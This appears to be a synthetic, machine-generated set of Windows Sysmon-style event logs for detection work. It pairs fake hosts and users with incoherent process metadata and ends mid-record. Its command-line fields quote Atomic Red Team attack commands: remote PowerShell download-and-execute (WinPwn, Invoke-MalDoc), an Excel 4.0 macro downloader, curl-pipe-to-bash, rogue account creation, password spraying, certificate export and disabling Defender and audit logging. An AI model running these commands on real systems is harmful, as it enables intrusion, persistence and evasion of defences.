    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-75.myers.net",
        "User": "april99",
        "ProcessID": 4948,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"mkdir \\\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\\\\"\\ncopy \\\"#{executable_binary}\\\" \\\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\mmc.exe\\\"\\nmklink c:\\\\testbypass.exe \\\"\\\\\\\\?\\\\C:\\\\Windows \\\\System32\\\\mmc.exe\\\"\\n\",",
        "LogonID": 330430,
        "LogonGuid": "242c957e-63a1-44a3-9b1b-40327c8ffb67",
        "SourceProcessID": 3009,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\red..exe",
        "DestinationProcessID": 9081,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\statement..exe",
        "UtcTime": "2024-05-17T01:36:51.873106Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-52.owen.com",
        "User": "annemoore",
        "ProcessID": 7546,
        "ProcessName": "nc.exe",
        "CommandLine": "\"net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\\"test share\\\" /CACHE:No\\n\",",
        "LogonID": 431115,
        "LogonGuid": "e82efde9-a9a6-4a21-a641-3191b99cf602",
        "SourceProcessID": 2266,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\nice..exe",
        "DestinationProcessID": 4011,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\theory..dll",
        "UtcTime": "2024-05-17T01:36:51.873106Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-52.wilson.org",
        "User": "jennifer72",
        "ProcessID": 3614,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$macro = [System.IO.File]::ReadAllText(\\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\\")\\n$macro = $macro -replace \\\"aREPLACEMEa\\\", \\\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\\"\\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\\"$macro\\\" -officeProduct \\\"Word\\\" -sub \\\"Extract\\\" -NoWrap\\n\",",
        "LogonID": 494394,
        "LogonGuid": "752c88bb-e565-49ff-982d-d2b1f6e34d49",
        "SourceProcessID": 9325,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\early..dll",
        "DestinationProcessID": 1479,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\forget..dll",
        "UtcTime": "2024-05-17T01:36:51.873106Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-60.jenkins.com",
        "User": "sarahmalone",
        "ProcessID": 2120,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Get-adcomputer -SearchScope subtree -filter \\\"name -like '*'\\\" -Properties *\",",
        "LogonID": 231689,
        "LogonGuid": "9c294e52-6c05-4755-89a5-81c0782296ba",
        "SourceProcessID": 5984,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\bill..exe",
        "DestinationProcessID": 7447,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\wrong..exe",
        "UtcTime": "2024-05-17T01:36:51.873106Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-65.jordan.org",
        "User": "natasha56",
        "ProcessID": 5972,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \\ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\\ndocker exec -i t1609_container bash -c \\\"cat /tmp/output.txt\\\"\\n\",",
        "LogonID": 648262,
        "LogonGuid": "f24020c8-6d85-4881-a506-bcb80fd4d46d",
        "SourceProcessID": 1197,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\face..dll",
        "DestinationProcessID": 4797,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\nor..exe",
        "UtcTime": "2024-05-17T01:36:51.873106Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-67.smith.net",
        "User": "qhuber",
        "ProcessID": 3216,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 757784,
        "LogonGuid": "adb1beea-c71d-4f33-942e-dbb6dfa5a4e4",
        "SourceProcessID": 5880,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\investment..dll",
        "DestinationProcessID": 5491,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\agree..exe",
        "UtcTime": "2024-05-17T01:36:51.874106Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-68.wilkinson-porter.com",
        "User": "christopherlopez",
        "ProcessID": 9555,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$fname = \\\"$env:TEMP\\\\atomic_redteam_x4m_exec.vbs\\\"\\n$fname1 = \\\"$env:TEMP\\\\procexp.exe\\\"\\nif (Test-Path $fname) {\\n  Remove-Item $fname\\n  Remove-Item $fname1\\n}\\n\\n$xlApp = New-Object -COMObject \\\"Excel.Application\\\"\\n$xlApp.Visible = $True\\n$xlApp.DisplayAlerts = $False\\n$xlBook = $xlApp.Workbooks.Add()\\n$sheet = $xlBook.Excel4MacroSheets.Add()\\n\\nif (\\\"#{uname}\\\" -ne \\\"\\\") {\\n  $sheet.Cells.Item(1,1) = \\\"#{uname}\\\"\\n} else {\\n  $sheet.Cells.Item(1,1) = \\\"=GET.WORKSPACE(26)\\\"\\n}\\n\\n$sheet.Cells.Item(2,1) = \\\"procexp.exe\\\"\\n$sheet.Cells.Item(3,1) = \\\"atomic_redteam_x4m_exec.vbs\\\"\\n$sheet.Cells.Item(4,1) = \\\"=IF(ISNUMBER(SEARCH(`\\\"64`\\\",GET.WORKSPACE(1))), GOTO(A5),)\\\"\\n$sheet.Cells.Item(5,1) = \\\"=FOPEN(`\\\"C:\\\\Users\\\\`\\\"&A1&`\\\"\\\\AppData\\\\Local\\\\Temp\\\\`\\\"&A3&`\\\"`\\\", 3)\\\"\\n$sheet.Cells.Item(6,1) = \\\"=FWRITELN(A5, `\\\"url = `\\\"`\\\"#{download_url}`\\\"`\\\"`\\\")\\\"\\n$sheet.Cells.Item(7,1) = \\\"=FWRITELN(A5, `\\\"`\\\")\\\"\\n$sheet.Cells.Item(8,1) = \\\"=FWRITELN(A5, `\\\"Set winHttp = CreateObject(`\\\"`\\\"WinHTTP.WinHTTPrequest.5.1`\\\"`\\\")`\\\")\\\"\\n$sheet.Cells.Item(9,1) = \\\"=FWRITELN(A5, `\\\"winHttp.Open `\\\"`\\\"GET`\\\"`\\\", url, False`\\\")\\\"\\n$sheet.Cells.Item(10,1) = \\\"=FWRITELN(A5, `\\\"winHttp.Send`\\\")\\\"\\n$sheet.Cells.Item(11,1) = \\\"=FWRITELN(A5, `\\\"If winHttp.Status = 200 Then`\\\")\\\"\\n$sheet.Cells.Item(12,1) = \\\"=FWRITELN(A5, `\\\"Set oStream = CreateObject(`\\\"`\\\"ADODB.Stream`\\\"`\\\")`\\\")\\\"\\n$sheet.Cells.Item(13,1) = \\\"=FWRITELN(A5, `\\\"oStream.Open`\\\")\\\"\\n$sheet.Cells.Item(14,1) = \\\"=FWRITELN(A5, `\\\"oStream.Type = 1`\\\")\\\"\\n$sheet.Cells.Item(15,1) = \\\"=FWRITELN(A5, `\\\"oStream.Write winHttp.responseBody`\\\")\\\"\\n$sheet.Cells.Item(16,1) = \\\"=FWRITELN(A5, `\\\"oStream.SaveToFile `\\\"`\\\"C:\\\\Users\\\\`\\\"&A1&`\\\"\\\\AppData\\\\Local\\\\Temp\\\\`\\\"&A2&`\\\"`\\\"`\\\", 2`\\\")\\\"\\n$sheet.Cells.Item(17,1) = \\\"=FWRITELN(A5, `\\\"oStream.Close`\\\")\\\"\\n$sheet.Cells.Item(18,1) = \\\"=FWRITELN(A5, `\\\"End If`\\\")\\\"\\n$sheet.Cells.Item(19,1) = \\\"=FCLOSE(A5)\\\"\\n$sheet.Cells.Item(20,1) = \\\"=EXEC(`\\\"explorer.exe C:\\\\Users\\\\`\\\"&A1&`\\\"\\\\AppData\\\\Local\\\\Temp\\\\`\\\"&A3&`\\\"`\\\")\\\"\\n$sheet.Cells.Item(21,1) = \\\"=WAIT(NOW()+`\\\"00:00:05`\\\")\\\"\\n$sheet.Cells.Item(22,1) = \\\"=EXEC(`\\\"explorer.exe C:\\\\Users\\\\`\\\"&A1&`\\\"\\\\AppData\\\\Local\\\\Temp\\\\`\\\"&A2&`\\\"`\\\")\\\"\\n$sheet.Cells.Item(23,1) = \\\"=HALT()\\\"\\n$sheet.Cells.Item(1,1).Name = \\\"runme\\\"\\n$xlApp.Run(\\\"runme\\\")\\n$xlApp.Quit()\\n\\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\\n[System.GC]::Collect()\\n[System.GC]::WaitForPendingFinalizers()\\n\\nRemove-Variable xlBook\\nRemove-Variable xlApp\\n\",",
        "LogonID": 822971,
        "LogonGuid": "29992183-e275-46e0-81f4-fc3f80fea062",
        "SourceProcessID": 1569,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\forward..exe",
        "DestinationProcessID": 2062,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\fact..exe",
        "UtcTime": "2024-05-17T01:36:51.874106Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-47.costa.com",
        "User": "imartin",
        "ProcessID": 9364,
        "ProcessName": "nc.exe",
        "CommandLine": "\"useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\\nsu art\\ncd /tmp\\ncurl -s #{remote_url} |bash\\n\",",
        "LogonID": 553898,
        "LogonGuid": "03b7faa9-c802-49af-9eac-ea54687b026d",
        "SourceProcessID": 9478,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\everyone..exe",
        "DestinationProcessID": 6007,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\level..dll",
        "UtcTime": "2024-05-17T01:36:51.874106Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-98.fowler.com",
        "User": "birdmichelle",
        "ProcessID": 7242,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$address = (& \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\searchVuln.exe\\\" \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\vuln_dll\\\\\\\" | Out-String | Select-String -Pattern \\\"VirtualAddress: (\\\\w+)\\\").Matches.Groups[1].Value\\n& \\\"PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\RWXinjectionLocal.exe\\\" \\\"#{vuln_dll}\\\" $address\\n\",",
        "LogonID": 520734,
        "LogonGuid": "45f3b59f-ee57-4c34-a913-692b4db38067",
        "SourceProcessID": 6452,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\culture..exe",
        "DestinationProcessID": 1261,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\number..exe",
        "UtcTime": "2024-05-17T01:36:51.874106Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-59.young.com",
        "User": "reginarobinson",
        "ProcessID": 6573,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cd \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\n.\\\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\\\bruteuser.txt TestUser1 \\n\",",
        "LogonID": 505359,
        "LogonGuid": "2a6981e8-19a4-42dc-bcfd-07057cbb45bd",
        "SourceProcessID": 8002,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\prove..dll",
        "DestinationProcessID": 2705,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\loss..dll",
        "UtcTime": "2024-05-17T01:36:51.874106Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-94.martinez-orozco.com",
        "User": "samanthaellis",
        "ProcessID": 9480,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"touch -m -t 197001010000.00 #{target_filename}\\n\",",
        "LogonID": 736394,
        "LogonGuid": "26075943-67cb-4622-b8b5-1c24db80d700",
        "SourceProcessID": 2590,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\maintain..dll",
        "DestinationProcessID": 6861,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\not..exe",
        "UtcTime": "2024-05-17T01:36:51.875105Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-37.thomas.com",
        "User": "bradley47",
        "ProcessID": 3686,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \\\"CN=Users,DC=#{domain},DC=#{top_level_domain}\\\" \\\"(objectClass=group)\\\" -s sub -a always -z 1000 dn \\n\",",
        "LogonID": 120402,
        "LogonGuid": "ee19c125-acff-4706-91ae-0d689251629f",
        "SourceProcessID": 6312,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\you..exe",
        "DestinationProcessID": 8141,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\cultural..exe",
        "UtcTime": "2024-05-17T01:36:51.875105Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-62.nichols.com",
        "User": "salazardennis",
        "ProcessID": 7128,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$archive=\\\"$env:PUBLIC\\\\T1649\\\\atomic_certs.zip\\\"\\n$exfilpath=\\\"$env:PUBLIC\\\\T1649\\\\certs\\\"\\nAdd-Type -assembly \\\"system.io.compression.filesystem\\\"\\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\\nmkdir $exfilpath | Out-Null\\nforeach ($cert in (gci Cert:\\\\CurrentUser\\\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\\\$($cert.FriendlyName).cer}\\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\\n\",",
        "LogonID": 123464,
        "LogonGuid": "db042f5f-ba91-4523-975b-666a29b4325d",
        "SourceProcessID": 8607,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\drive..exe",
        "DestinationProcessID": 9470,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\throw..dll",
        "UtcTime": "2024-05-17T01:36:51.875105Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-96.weeks-rodriguez.info",
        "User": "joseph94",
        "ProcessID": 9744,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"#{msbuildpath}\\\\#{msbuildname} \\\"#{filename}\\\"\\n\",",
        "LogonID": 989931,
        "LogonGuid": "772f2114-a95b-4f81-8f44-9f3ad50de143",
        "SourceProcessID": 4730,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\coach..exe",
        "DestinationProcessID": 7453,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\Democrat..dll",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-56.michael.com",
        "User": "lindavega",
        "ProcessID": 6938,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nbluekeep -noninteractive -consoleoutput\",",
        "LogonID": 567999,
        "LogonGuid": "f204c998-d004-4c8a-bf37-148e41a532d2",
        "SourceProcessID": 8137,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\natural..exe",
        "DestinationProcessID": 1700,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\fact..dll",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-50.patterson.com",
        "User": "kara50",
        "ProcessID": 6650,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"passwd #{user_account} #enter admin password > enter new password > confirm new password\\n\",",
        "LogonID": 438382,
        "LogonGuid": "f27e01d2-ccef-4850-b8a3-32d31bdeba0c",
        "SourceProcessID": 9817,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\career..exe",
        "DestinationProcessID": 7738,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\son..dll",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-68.duncan.com",
        "User": "samanthawiggins",
        "ProcessID": 4330,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\\"\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\\"\\ncscript.exe \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\\"\\ncscript.exe \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\\"\\n\",",
        "LogonID": 830563,
        "LogonGuid": "bfa7301a-9ab9-4c69-86ca-884efbcb59db",
        "SourceProcessID": 9620,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\whole..dll",
        "DestinationProcessID": 3986,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\sense..dll",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-80.guzman-reyes.com",
        "User": "michellegarrett",
        "ProcessID": 2835,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cat /etc/passwd |grep nobody \\n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nchsh --shell /bin/bash nobody\\nusermod --password $(openssl passwd -1 nobody) nobody\\nsu nobody\\nwhoami\\nexit\\n\",",
        "LogonID": 667567,
        "LogonGuid": "1d2a76a3-b7a0-493b-b88a-85507b93453d",
        "SourceProcessID": 8760,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\technology..exe",
        "DestinationProcessID": 7144,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\she..exe",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-10.conner-bradshaw.com",
        "User": "elizabeth64",
        "ProcessID": 8628,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"defaults write com.apple.finder AppleShowAllFiles YES\\n\",",
        "LogonID": 930619,
        "LogonGuid": "60bce863-0a15-4fc7-8357-6644b3eb92b7",
        "SourceProcessID": 7757,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\office..exe",
        "DestinationProcessID": 8122,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\lose..exe",
        "UtcTime": "2024-05-17T01:36:51.875613Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-99.wilkinson-hernandez.biz",
        "User": "nguyenangela",
        "ProcessID": 3585,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoDesktop /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 181245,
        "LogonGuid": "8d75e6da-8b4a-4565-aa4e-0223477dbe7a",
        "SourceProcessID": 9794,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\real..dll",
        "DestinationProcessID": 6842,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\responsibility..dll",
        "UtcTime": "2024-05-17T01:36:51.876619Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-25.lewis.com",
        "User": "douglaswatson",
        "ProcessID": 9457,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-ExchangeOnline -Credential $creds\\nSet-MailboxAuditBypassAssociation -Identity \\\"#{target_email}\\\" -AuditBypassEnabled $true\\n\",",
        "LogonID": 368963,
        "LogonGuid": "55768245-3508-41c5-b800-2ce3bde5d79a",
        "SourceProcessID": 7818,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\century..dll",
        "DestinationProcessID": 7713,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\low..exe",
        "UtcTime": "2024-05-17T01:36:51.876619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-42.young.com",
        "User": "danagreen",
        "ProcessID": 2152,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 399219,
        "LogonGuid": "e2c39bed-a40c-4515-97fc-445fe0dbbe60",
        "SourceProcessID": 8564,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\card..dll",
        "DestinationProcessID": 4389,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\want..exe",
        "UtcTime": "2024-05-17T01:36:51.876619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-48.kim-chen.info",
        "User": "stevenhall",
        "ProcessID": 1037,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net user \\\"#{username}\\\" \\\"#{password}\\\" /add /domain\\nnet group \\\"#{group}\\\" \\\"#{username}\\\" /add /domain\\n\",",
        "LogonID": 746441,
        "LogonGuid": "c808af92-f5a3-4e71-9c34-8a526073cb56",
        "SourceProcessID": 8336,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\system..exe",
        "DestinationProcessID": 7183,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\task..exe",
        "UtcTime": "2024-05-17T01:36:51.876619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-48.martinez.com",
        "User": "braynicole",
        "ProcessID": 9534,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"function Invoke-dpsLight ($Password, $userlist) {\\n$users = Get-Content $userlist\\n$Domain = \\\"LDAP://\\\" + ([ADSI]\\\"\\\").distinguishedName\\nforeach ($User in $users) {\\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\\n  if ($Domain_check.name -ne $null) {\\n    Write-Host -ForegroundColor Green \\\"Password found for User:$User Password:$Password\\\"\\n  }\\n  else { Write-Host \\\". \\\" -NoNewline}\\n}\\nWrite-Host -ForegroundColor green \\\"Finished\\\"\\n}\\nInvoke-dpsLight \\\"#{password}\\\" $env:Temp\\\\usersdpsLight.txt\\n\",",
        "LogonID": 577814,
        "LogonGuid": "08619c60-c5e1-4053-bd5b-4ffa99bb530d",
        "SourceProcessID": 9204,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\democratic..dll",
        "DestinationProcessID": 9001,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\measure..exe",
        "UtcTime": "2024-05-17T01:36:51.877620Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-96.norman-knight.com",
        "User": "garciajoshua",
        "ProcessID": 6991,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideSCAHealth /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 610381,
        "LogonGuid": "8d3532de-fecb-4091-9776-25df442a7968",
        "SourceProcessID": 8787,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\matter..exe",
        "DestinationProcessID": 5618,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\natural..exe",
        "UtcTime": "2024-05-17T01:36:51.877620Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-86.gutierrez.com",
        "User": "joshua41",
        "ProcessID": 3424,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 823048,
        "LogonGuid": "1cfcf6d2-bba5-42b9-9edf-f4a44b6770cd",
        "SourceProcessID": 3785,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\truth..exe",
        "DestinationProcessID": 3741,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\financial..exe",
        "UtcTime": "2024-05-17T01:36:51.877620Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-00.york.com",
        "User": "jonathanwilson",
        "ProcessID": 6724,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"for bucket in \\\"$(aws s3 ls | cut -d \\\" \\\" -f3)\\\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\\n\",",
        "LogonID": 419862,
        "LogonGuid": "2e73cf64-dcf9-4e66-92e9-e5840eb29e3a",
        "SourceProcessID": 9785,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\person..exe",
        "DestinationProcessID": 5344,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\expect..exe",
        "UtcTime": "2024-05-17T01:36:51.877620Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-29.perry.com",
        "User": "richard78",
        "ProcessID": 7596,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\lsm.exe\\nC:\\\\lsm.exe /c echo T1036.003 > C:\\\\T1036.003.txt\\n\",",
        "LogonID": 312164,
        "LogonGuid": "8268909d-9b22-412a-bd2d-465e67baad96",
        "SourceProcessID": 5345,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\care..dll",
        "DestinationProcessID": 6877,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\sometimes..dll",
        "UtcTime": "2024-05-17T01:36:51.877620Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-35.martin.org",
        "User": "amy82",
        "ProcessID": 2780,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"C:\\\\Program Files\\\\Windows Defender\\\\MpCmdRun.exe\\\" -RemoveDefinitions -All\\n\",",
        "LogonID": 285405,
        "LogonGuid": "802ca8f0-0270-4d81-bafc-12d2ba138dda",
        "SourceProcessID": 3208,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\organization..dll",
        "DestinationProcessID": 3626,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\later..dll",
        "UtcTime": "2024-05-17T01:36:51.878619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-27.gray.com",
        "User": "norma78",
        "ProcessID": 1025,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo #{bash_encoded} | b64decode -r | sh\\necho #{dash_encoded} | b64decode -r | sh\\necho #{fish_encoded} | b64decode -r | sh\\necho #{sh_encoded} | b64decode -r | sh\\n\",",
        "LogonID": 224932,
        "LogonGuid": "372d1101-af8e-4dbe-8f51-202a643a10e4",
